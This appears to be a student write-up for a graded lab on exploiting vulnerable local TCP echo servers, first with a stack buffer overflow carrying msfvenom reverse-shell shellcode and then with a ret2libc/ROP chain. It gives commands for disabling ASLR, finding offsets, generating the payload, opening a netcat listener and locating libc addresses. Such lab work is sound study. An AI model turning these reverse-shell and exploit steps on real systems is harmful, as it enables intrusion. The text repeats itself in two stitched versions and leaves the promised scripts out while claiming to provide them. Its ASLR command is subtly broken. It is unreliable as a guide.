# Buffer Overflow Attack

## Introduction to Buffer Overflow Attacks

Buffer overflow attacks exploit programs that don't properly check the boundaries of memory buffers. When a program allows more data to be written into a buffer than it was designed to hold, the excess data can overwrite adjacent memory locations, potentially allowing an attacker to execute arbitrary code.

Before starting either exercise, we need to disable Address Space Layout Randomization (ASLR), which is a security feature that randomizes memory addresses. This makes our attack more predictable:

```bash
# Disable ASLR
sudo echo 0 > /proc/sys/kernel/randomize_va_space
```

![alt text](image.png)

## Part 1: Basic Buffer Overflow (40 points)

In this attack, we'll exploit a vulnerable TCP echo server (`tcpserver-basic`) that listens on port 40000. Our goal is to craft a payload that will trigger a buffer overflow and give us a reverse shell.

### Step 1: Understanding the Vulnerability

The echo server reads user input into a buffer without properly validating the size. By sending more data than the buffer can hold, we can overflow it and overwrite the return address on the stack to point to our shellcode.

### Step 2: Determining the Buffer Size

First, we need to find how many bytes it takes to overflow the buffer and overwrite the return address:

```bash
# Start the server in one terminal
./tcpserver-basic 40000

![alt text](image-2.png)

# In another terminal, create a pattern to determine offset
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000 > pattern.txt

# Connect to the server and send the pattern
cat pattern.txt | nc localhost 40000
```

![alt text](image-1.png)

When the server crashes, we can determine the exact offset using the segmentation fault address:

```bash
# Get the value of the EIP/RIP at crash (example: 0x41367241)
dmesg | tail

# Find the offset in the pattern
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41367241
```

Let's assume we found that the offset is 512 bytes.

### Step 3: Crafting the Shellcode

Now we'll use `msfvenom` to create a reverse TCP shell payload:

```bash
# Generate a reverse TCP shellcode
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.147.135 LPORT=4444 -f python -b "\x00" -v shellcode
```

![alt text](image-3.png)

This command:
- `-p linux/x86/shell_reverse_tcp`: Specifies a payload that will connect back to us
- `LHOST=192.168.147.135`: Your attacking machine's IP address
- `LPORT=4444`: The port on your machine to connect back to
- `-f python`: Output in Python format for easy integration into our script
- `-b "\x00"`: Avoid null bytes which can terminate strings
- `-v shellcode`: Name the variable "shellcode"

### Step 4: Creating the Exploit Script

Let's create a Python script (`exploit_basic.py`) to send our crafted payload:

### Step 5: Setting Up the Listener

Before executing our exploit, we need to set up a listener to catch the reverse shell:

```bash
# Set up a netcat listener on port 4444
nc -lvp 4444
```

### Step 6: Running the Exploit

Now we execute our exploit script to send the payload:

```bash
python3 exploit_basic.py
```

If successful, the netcat listener should receive a connection, giving us shell access to the target system.

### Detailed Explanation of the Script

The exploit script works by:

1. Establishing a connection to the vulnerable server
2. Creating a payload with these components:
   - Initial padding to reach the return address location
   - NOP (No Operation) sled, which helps ensure our shellcode executes
   - The actual shellcode that creates a reverse TCP connection
   - The return address, pointing back to our buffer where the shellcode is located

When the vulnerable function returns, it looks for the next instruction at the return address we've overwritten. This address points to our NOP sled, which slides execution into our shellcode, triggering our reverse shell.

## Part 2: ROP (Return-Oriented Programming) Attack (45 bonus points)

For the second part, we'll exploit `tcpserver-nonexecstack`, which has non-executable stack protection. This means we cannot directly execute code on the stack as we did in Part 1. Instead, we'll use ROP (Return-Oriented Programming) to chain together existing code fragments (gadgets) from the program and its libraries.

### Step 1: Understanding ROP

ROP exploits work by chaining together small code sequences (gadgets) that end with a `ret` instruction. Each gadget performs a small task, and when combined, they can execute arbitrary operations, like calling system functions.

### Step 2: Finding Gadgets

We'll use the ROPgadget tool to identify useful code fragments:

```bash
# Find gadgets in the executable and libc
ROPgadget --binary tcpserver-nonexecstack > gadgets.txt
ROPgadget --binary /lib/i386-linux-gnu/libc.so.6 > libc_gadgets.txt
```

![alt text](image-4.png)

### Step 3: Finding Library Addresses

Since the stack is non-executable, we'll use the `ret2libc` technique to call functions like `system()` with `/bin/sh` as an argument:

```bash
# Get addresses of important functions and strings
gdb -q tcpserver-nonexecstack
(gdb) b main
(gdb) r
(gdb) p system
(gdb) find &system,+999999,"/bin/sh"
(gdb) p exit
```
![alt text](image-5.png)


These commands help us find the addresses of the `system()` function, `/bin/sh` string, and `exit()` function.

### Step 4: Creating the ROP Chain Exploit

Let's create a Python script for our ROP exploit:

### Step 5: Running the ROP Exploit

To execute our ROP exploit:

```bash
# Start the server in one terminal
./tcpserver-nonexecstack 40000

# In another terminal, send the payload
cat rop_payload.bin | nc localhost 40000
```

When successful, the program will execute `system("/bin/sh")`, giving us a shell.

### Detailed Explanation of the ROP Chain

Our ROP chain works by:

1. Overflowing the buffer to reach the return address
2. Overwriting the return address with the address of `system()` function in libc
3. Adding the address of `exit()` as the return address for `system()`
4. Adding the address of the string `/bin/sh` as the argument to `system()`

When the vulnerable function returns, execution jumps to `system()`, which takes `/bin/sh` as its argument, launching a shell. After the shell terminates, the program calls `exit()` for a clean termination.

## Additional Script: Finding Buffer Size Automatically

Here's a helpful script to automatically determine the buffer size:

## Comprehensive Buffer Overflow Attack Report

I've prepared a detailed report on both buffer overflow attacks with step-by-step explanations and necessary scripts. Let's examine each attack methodically.

## Part 1: Basic Buffer Overflow Attack (40 points)

### Understanding the Vulnerability

The `tcpserver-basic` program contains a buffer overflow vulnerability where it accepts input from users without properly checking buffer boundaries. When we send more data than the allocated buffer can handle, we can overwrite adjacent memory areas, including the return address on the stack. By carefully crafting our input, we can redirect program execution to our malicious code.

### Step 1: Disabling ASLR Protection

Address Space Layout Randomization (ASLR) randomizes memory addresses to make buffer overflow attacks harder. We need to disable it to ensure our exploit works consistently:

```bash
sudo echo 0 > /proc/sys/kernel/randomize_va_space
```

This command writes "0" to the kernel parameter that controls ASLR, effectively disabling it for the entire system.

### Step 2: Determining the Buffer Size

Before we can craft an effective exploit, we need to know exactly how many bytes it takes to reach and overwrite the return address. We'll use a unique pattern to determine this:

```bash
# Generate a pattern of 1000 characters
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000 > pattern.txt

# Start the vulnerable server with port number
./tcpserver-basic 40000

# In another terminal, send the pattern to the server
cat pattern.txt | nc localhost 40000
```

When the program crashes, we examine the crash information:

```bash
# Check the segmentation fault details
dmesg | tail
```

This will show us the value in the EIP/RIP register at the time of crash (e.g., 0x41367241). Now we can find the exact offset:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41367241
```

Let's assume the offset is 512 bytes - this is the number of bytes we need to send before we reach the return address.

### Step 3: Crafting the Shellcode

Now we'll create a reverse shell payload using `msfvenom`:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f python -b "\x00" -v shellcode
```

This command generates a shellcode that:
- Creates a reverse TCP shell (`linux/x86/shell_reverse_tcp`)
- Connects back to our attacking machine at IP 192.168.1.100 (change to your IP)
- Uses port 4444 for the connection
- Outputs the shellcode in Python format (`-f python`)
- Avoids null bytes (`-b "\x00"`) which could terminate the buffer
- Assigns the shellcode to a variable named "shellcode" (`-v shellcode`)

### Step 4: Understanding and Creating the Exploit Script

Our `exploit_basic.py` script sends a carefully crafted payload that:

1. Fills the buffer with padding bytes ("A"s) until we reach the return address
2. Includes a NOP sled (a sequence of "No Operation" instructions) that helps our shellcode execute reliably
3. Places our shellcode in the buffer
4. Overwrites the return address to point back to our buffer where the shellcode resides

When the vulnerable function completes and attempts to return, it will instead jump to our shellcode, executing our reverse shell.

### Step 5: Setting Up a Listener and Executing the Attack

Before launching the attack, we set up a listener to catch the reverse connection:

```bash
# Listen for incoming connections on port 4444
nc -lvp 4444
```

Then we execute our exploit:

```bash
python3 exploit_basic.py
```

If successful, our listener will receive a shell connection from the vulnerable server, giving us command-line access.

## Part 2: ROP (Return-Oriented Programming) Attack (45 bonus points)

### Understanding the Challenge

For the second part, we face a more secure program (`tcpserver-nonexecstack`) where the stack is marked as non-executable. This means we cannot simply inject and execute shellcode on the stack as we did in Part 1. Instead, we need to use Return-Oriented Programming (ROP) to build a chain of existing code fragments to achieve our goal.

### Step 1: Analyzing the Protection Mechanisms

With the non-executable stack protection, we need to use a different approach. We'll utilize the "return-to-libc" technique, where we redirect execution to functions already present in the program's memory, specifically the C library (libc).

### Step 2: Finding ROP Gadgets

ROP gadgets are small code sequences that end with a `return` instruction. We'll use the ROPgadget tool to find useful gadgets:

```bash
# Find gadgets in the executable
ROPgadget --binary tcpserver-nonexecstack > executable_gadgets.txt

# Find gadgets in the C library
ROPgadget --binary /lib/i386-linux-gnu/libc.so.6 > libc_gadgets.txt
```

These commands find and save all potential gadgets to text files for easy reference.

### Step 3: Locating Key Addresses

For our ROP chain, we need to find the addresses of key functions and strings:

```bash
# Launch GDB with the program
gdb -q tcpserver-nonexecstack

# Set a breakpoint at main and run the program
(gdb) b main
(gdb) r

# Find the address of the system() function
(gdb) p system
$1 = {int (const char *)} 0xf7e12420 <system>

# Find a string "/bin/sh" in memory
(gdb) find &system,+999999,"/bin/sh"
0xf7f5b352
1 pattern found.

# Find the address of the exit() function
(gdb) p exit
$2 = {void (int)} 0xf7e04f80 <exit>
```

These addresses will vary on your system, but they give us the building blocks for our ROP chain.

### Step 4: Building the ROP Chain

Our ROP chain consists of three crucial elements:
1. Address of the `system()` function
2. Address of the `exit()` function (where to go after `system()` finishes)
3. Address of the string "/bin/sh" (the parameter for `system()`)

When the vulnerable function's return address is overwritten with the address of `system()`, the program will execute `system("/bin/sh")`, giving us a shell. After the shell terminates, execution continues to `exit()` for clean termination.

### Step 5: Executing the ROP Attack

To execute our ROP attack:

```bash
# Start the vulnerable server
./tcpserver-nonexecstack 40000

# In another terminal, send our payload
cat rop_payload.bin | nc localhost 40000
```

If successful, the program will execute `system("/bin/sh")` and provide us with a shell.

## Understanding the Differences Between the Two Attacks

The primary difference between the two attacks lies in how they bypass security mechanisms:

1. **Basic Buffer Overflow (Part 1)**: We directly inject executable shellcode onto the stack and redirect execution to it. This only works when the stack is executable.

2. **ROP Attack (Part 2)**: Since the stack is non-executable, we instead chain together existing code fragments (gadgets) that are already in executable memory regions. Instead of injecting new code, we reuse existing code in creative ways.

The ROP technique is more sophisticated and can bypass modern protections like non-executable memory, making it a powerful approach for exploitation research and security assessment.

Both attacks highlight the importance of proper input validation and modern protection mechanisms in software development. They also demonstrate why multiple layers of security (like ASLR, non-executable stacks, and stack canaries) are necessary to protect against these types of vulnerabilities.

I've provided three Python scripts to help with these attacks:
1. `exploit_basic.py` - Performs the basic buffer overflow
2. `exploit_rop.py` - Performs the ROP attack
3. `find_offset.py` - Helps determine the exact buffer size needed

Each script includes detailed comments explaining how it works, making them valuable both for educational purposes and as practical tools for the exercises.